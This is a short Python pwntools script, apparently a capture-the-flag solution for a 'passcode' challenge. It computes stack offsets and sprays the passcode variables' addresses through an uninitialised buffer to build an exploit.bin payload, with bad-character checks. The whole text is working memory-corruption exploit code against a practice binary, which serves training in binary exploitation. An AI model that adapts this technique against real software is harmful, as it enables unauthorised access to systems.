from pwn import *

# Welcome
welcome_buffer = 0xffffce18

# Login
ebp = 0xffffce88
passcode_1 = ebp - 0x10 # 0xffffce78
passcode_2 = ebp - 0x0c # 0xffffce7c

print("0x%x"%passcode_1)
print("0x%x"%passcode_2)

# Offset

offset = passcode_1 - welcome_buffer

print("0x%x"%offset)

exploit = ""
# exploit += "A" * offset
for _ in range(int(offset / 8) + 1):
    exploit += p32(passcode_1)
    exploit += p32(passcode_2)

assert len(exploit) <= 100

exploit += "\n"
exploit += "338150" # 0x528e6
exploit += "\n"
exploit += "13371337" # 0xcc07c9
exploit += "\n"

# Check for no bad chars

assert "\0" not in exploit
assert " " not in exploit
assert "\r" not in exploit
assert "\t" not in exploit
assert exploit.count("\n") == 3

with open("exploit.bin", "wb") as f:
    f.write(exploit)
